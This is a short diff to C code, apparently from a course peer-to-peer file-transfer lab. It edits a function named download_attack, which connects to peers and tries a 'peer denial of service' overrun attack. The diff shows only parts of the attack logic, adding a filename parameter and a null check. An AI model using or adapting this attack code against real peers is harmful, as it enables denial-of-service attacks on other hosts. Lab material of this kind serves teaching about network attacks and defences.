@@ -766,11 +766,11 @@ static void task_upload(task_t *t)
 }
 
 // this is where the evil happens
-void download_attack(task_t *tracker_task)
+void download_attack(task_t *tracker_task, const char *filename)
 {
-	task_t *t = start_download(tracker_task, NULL);
+	task_t *t = start_download(tracker_task, filename);
 
-	if (t == NULL){
+	if (t == NULL || t->peer_list == NULL){
 		error("* Error: Can't proceed with download attack.");
 		return;
 	}
@@ -804,8 +804,7 @@ void download_attack(task_t *tracker_task)
 
 		//Next try a peer overrun attack
 		message("* Try attacking %s:%d with '%s' peer denial of service\n", 
-		inet_ntoa(t->peer_list->addr), 
-		t->peer_list->port, t->filename);
+			inet_ntoa(t->peer_list->addr), t->peer_list->port, t->filename);
 		// try once
 		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
 		if (t->peer_fd == -1) {
@@ -825,7 +824,6 @@ void download_attack(task_t *tracker_task)
 			close(t->peer_fd);
 			//All attacks on the peer done
 			message("* Tried attacking %s:%d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
-			task_pop_peer(t);
 			exit(0);
 	}
 	task_free(t);
